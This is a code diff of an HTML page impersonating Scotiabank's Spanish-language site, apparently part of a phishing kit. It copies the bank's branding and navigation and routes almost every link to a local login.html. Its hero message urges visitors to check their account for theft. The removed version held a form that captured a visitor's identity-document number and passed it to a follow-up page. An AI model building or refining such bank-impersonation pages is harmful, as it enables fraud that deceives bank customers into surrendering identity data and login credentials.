@@ -4,62 +4,235 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Scotiabank - Verificación de Documento</title>
-    <link rel="stylesheet" href="styles.css">
+    <title>Scotiabank</title>
     <script src="https://kit.fontawesome.com/3297378b0c.js" crossorigin="anonymous"></script>
     <link rel="icon" href="onlylogo.png" type="image/png">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 15px;
+        }
+        
+        .top-nav {
+            border-bottom: 1px solid #e5e5e5;
+        }
+        
+        .top-nav ul {
+            list-style-type: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+        }
+        
+        .top-nav li {
+            padding: 10px 15px;
+        }
+        
+        .top-nav a {
+            text-decoration: none;
+            color: #333;
+            font-size: 14px;
+        }
+        
+        .top-nav a.active {
+            color: #E31837;
+            border-bottom: 2px solid #E31837;
+        }
+        
+        .containerpr {
+            display: flex;
+            width: 100%;
+        }
+        
+        .main-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            border-bottom: 1px solid #e5e5e5;
+        }
+        
+        .logo {
+            width: 180px;
+            height: 30px;
+        }
+        
+        .search-bar {
+            flex-grow: 1;
+            max-width: 400px;
+            margin: 0 20px;
+        }
+        
+        .search-bar input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        
+        .header-actions {
+            display: flex;
+            align-items: center;
+        }
+        
+        .header-actions a {
+            text-decoration: none;
+            color: #333;
+            margin-left: 20px;
+            font-size: 14px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .header-actions img {
+            width: 24px;
+            height: 24px;
+            margin-bottom: 5px;
+        }
+        
+        .btn {
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-size: 14px;
+            text-decoration: none;
+            margin-left: 10px;
+        }
+        
+        .btn-primary {
+            background-color: #E31837;
+            color: white;
+        }
+        
+        .btn-secondary {
+            border: 1px solid #E31837;
+            color: #E31837;
+        }
+        
+        .secondary-nav {
+            border-bottom: 1px solid #e5e5e5;
+        }
+        
+        .secondary-nav ul {
+            list-style-type: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+        }
+        
+        .secondary-nav li {
+            padding: 10px 15px;
+        }
+        
+        .secondary-nav a {
+            text-decoration: none;
+            color: #333;
+            font-size: 14px;
+        }
+        
+        .hero {
+            display: flex;
+            height: 77vh;
+        }
+        
+        .hero-content {
+            background-color: #E31837;
+            color: white;
+            padding: 40px;
+            width: 50%;
+        }
+        
+        .hero-content h1 {
+            font-size: 36px;
+            margin-bottom: 20px;
+        }
+        
+        .hero-content p {
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+        
+        .hero-image {
+            width: 50%;
+            background-image: url('imagendisculpa.png');
+            background-size: cover;
+            background-position: bottom;
+        }
+    </style>
 </head>
 
 <body>
-    <header>
-        <img src="logoname.png" alt="Scotiabank" class="logo">
+    <nav class="top-nav">
+        <div class="container">
+            <ul>
+                <li><a href="#" class="active">Personas</a></li>
+                <li><a href="login.html">Beyond</a></li>
+                <li><a href="login.html">Premium</a></li>
+                <li><a href="login.html">Wealth</a></li>
+                <li><a href="login.html">Negocios</a></li>
+                <li><a href="login.html">Empresas</a></li>
+                <li><a href="login.html">Quiénes Somos</a></li>
+                <li style="margin-left: auto;"><a href="login.html">More Sites</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <header class="main-header">
+        <div class="container containerpr">
+            <img src="logoname.png" alt="Scotiabank" class="logo">
+            <div class="search-bar">
+                <input type="text" placeholder="Búsqueda">
+            </div>
+            <div class="header-actions">
+                <a href="login.html">
+                    <i class="fa-solid fa-sack-dollar"></i>
+                    <span>ScotiaCombos</span>
+                </a>
+                <a href="login.html">
+                    <i class="fa-solid fa-location-dot"></i>
+                    <span>Agencias</span>
+                </a>
+                <a href="login.html">
+                    <i class="fa-solid fa-user"></i>
+                    <span>Hazte Cliente</span>
+                </a>
+                <a href="login.html" class="btn btn-primary">Acceder</a>
+                <a href="#" class="btn btn-secondary">Abrir Cuenta</a>
+            </div>
+        </div>
     </header>
 
-    <main>
-        <div class="card">
-            <img src="onlylogo.png" alt="Scotiabank Icon" class="icon">
-
-            <!-- Modificación del formulario -->
-            <form id="document-form" action="continue.html" method="get" onsubmit="sendDocumentNumber()">
-                <div class="form-group">
-                    <label for="document-type">Tipo de documento</label>
-                    <select id="document-type" name="document-type" required>
-                        <option value="DNI">DNI</option>
-                        <option value="Pasaporte">Pasaporte</option>
-                        <option value="CE">Carnet de Extranjería</option>
-                    </select>
-                </div>
-
-                <div class="form-group">
-                    <label for="document-number">Número de documento</label>
-                    <input type="tel" id="document-number" name="document-number" placeholder="12345678" required pattern="\d{8}" maxlength="8" oninput="this.value = this.value.replace(/\D/g, '').slice(0, 8);" title="Debe ingresar exactamente 8 números">
-
-                </div>
-
-                <button type="submit" class="btn-submit">Continuar</button>
-            </form>
+    <nav class="secondary-nav">
+        <div class="container">
+            <ul>
+                <li><a href="login.html">Canales Digitales</a></li>
+                <li><a href="login.html">Ahorros</a></li>
+                <li><a href="login.html">Tarjetas</a></li>
+                <li><a href="login.html">Préstamos</a></li>
+                <li><a href="login.html">Depósitos e Inversión</a></li>
+                <li><a href="login.html">Seguros</a></li>
+                <li><a href="login.html">Scotiabank Beneficios</a></li>
+                <li><a href="login.html">Financieros</a></li>
+                <li><a href="login.html">Servicios</a></li>
+            </ul>
         </div>
-    </main>
+    </nav>
 
-    <footer>
-        <a href="#" class="footer-link">
-            <i class="fa-solid fa-phone"></i> Llámanos
-        </a>
-        <a href="#" class="footer-link">
-            <i class="fa-solid fa-location-dot"></i> Ubícanos
-        </a>
-    </footer>
-
-    <!-- Script para enviar datos en la URL -->
-    <script>
-        function sendDocumentNumber() {
-            // Obtener el valor del campo "Número de documento"
-            const documentNumber = document.getElementById('document-number').value;
-
-            // Cambiar la acción del formulario para incluir el número de documento en la URL
-            document.getElementById('document-form').action = `continue.html?document-number=${encodeURIComponent(documentNumber)}`;
-        }
-    </script>
+    <section class="hero">
+        <div class="hero-content">
+            <h1>Protege ahora tus Beneficios con Scotiabank</h1>
+            <p>Revisa tu cuenta y mantente alerta a cualquier robo</p>
+            <a href="login.html" class="btn btn-secondary" style="background-color: white;">Descubre más</a>
+        </div>
+        <div class="hero-image"></div>
+    </section>
 </body>
 
 </html>
